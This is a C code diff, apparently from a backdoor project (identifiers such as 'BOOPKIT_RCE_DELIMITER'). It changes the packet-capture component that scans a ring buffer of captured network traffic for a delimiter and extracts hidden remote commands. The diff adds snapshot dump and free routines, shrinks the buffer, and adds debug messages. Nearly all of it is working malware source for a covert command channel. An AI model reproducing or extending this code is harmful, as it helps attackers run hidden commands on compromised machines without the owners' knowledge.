@@ -37,7 +37,8 @@
 
 //--- [ Header ] ---
 
-#define XCAP_BUFFER_SIZE 1024
+//#define XCAP_BUFFER_SIZE 16384
+#define XCAP_BUFFER_SIZE 64
 
 typedef struct xcap_ip_packet {
   int captured;
@@ -75,9 +76,38 @@ int rce_filter(char *raw, char *rce){
   return 0;
 }
 
+void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]){
+  boopprintf("  -> Dumping Raw Snapshot:\n");
+  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+    struct xcap_ip_packet *xpack;
+    xpack = snap[i];
+    if (!xpack->captured) {
+      continue;
+    }
+    unsigned char *packet = xpack->packet;
+    for (int j = 0; j < xpack->header->len; j++){
+      boopprintf("%c", packet[j]);
+    }
+    boopprintf("\n");
+  }
+}
+
+void snapshot_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]){
+  boopprintf("  -> Free Snapshot\n");
+  for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
+    struct xcap_ip_packet *xpack;
+    xpack = snap[i];
+    xpack->captured = 0;
+    free(xpack->packet);
+    free(xpack->iph);
+    free(xpack->header);
+    free(xpack);
+  }
+}
+
 void *xcap(void *v_dev_name) {
   char *dev_name = (char *)v_dev_name;
-  boopprintf("  -> Starting xCap Interface  : %s\n", dev_name);
+  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);
 
   // Initialize ring buffer
   for (int ii = 0; ii < XCAP_BUFFER_SIZE; ii++) {
@@ -124,7 +154,7 @@ void *xcap(void *v_dev_name) {
   }
   // --- [ Filter ] ---
 
-  boopprintf("  -> Listening xCap Kernel packets:\n");
+  boopprintf("  -> xCap RingBuffer Started : %s\n",dev_name);
 
   /* Search for RCE */
   struct ether_header *ep;
@@ -242,15 +272,25 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
     char *rce_sub;
     rce_sub = memmem(packet, xpack->header->len, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
     if (rce_sub != NULL) {
+      boopprintf("  -> Found RCE xCap!\n");
       int found;
       found = rce_filter(rce_sub, rce);
       if (found){
-        boopprintf("  -> Found RCE xCap: %s\n", rce);
+        snapshot_free(snap);
         return 0; // Money, Success, Fame, Glamour
+      }else {
+        boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
+        snapshot_dump(snap);
+        snapshot_free(snap);
+        return 1;
       }
     }
   }
+  boopprintf("  -> No RCE in xCap!\n");
+  snapshot_dump(snap);
+  snapshot_free(snap);
   return 1;
   // return 0; // When we found our RCE!
 }
+
 
